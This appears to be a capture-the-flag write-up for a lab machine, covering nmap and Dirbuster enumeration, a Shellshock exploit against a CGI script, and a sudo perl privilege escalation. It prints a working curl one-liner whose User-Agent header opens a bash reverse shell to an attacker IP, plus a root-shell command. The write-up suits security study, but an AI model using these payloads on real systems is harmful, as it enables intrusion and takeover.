# ENUM

### Nmap Scan

```
PORT     STATE SERVICE
80/tcp   open  http
2222/tcp open  EtherNetIP-1
```

### Detailed Scan
```
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

***
### Dir Fuzzing
**Tool Used:- `Dirbuster`**

Found `/cgi-bin`  dir but ==> 404

 - CGI-bin is a folder used to **house scripts** that will interact with a Web browser to provide functionality for a Web page or website

On Fuzzing for possible scripts using `Dirbuster`

found `/cgi-bin/user.sh`
***

# Getting Shell

Found to be Vuln to `Shell-Shock`

- https://antonyt.com/blog/2020-03-27/exploiting-cgi-scripts-with-shellshock


```bash
curl -i -H "User-agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.14.47/443 0>&1" http://10.10.10.56/cgi-bin/user.sh
```

Got a `Rev-Shell` 
***
# Prev Esc
Checking User's Privilage: `sudo -l`

user can run `/usr/bin/perl` with `NOPASSWD`

```bash
sudo perl -e 'exec "/bin/sh";'
``` 

- https://gtfobins.github.io/gtfobins/perl/

***
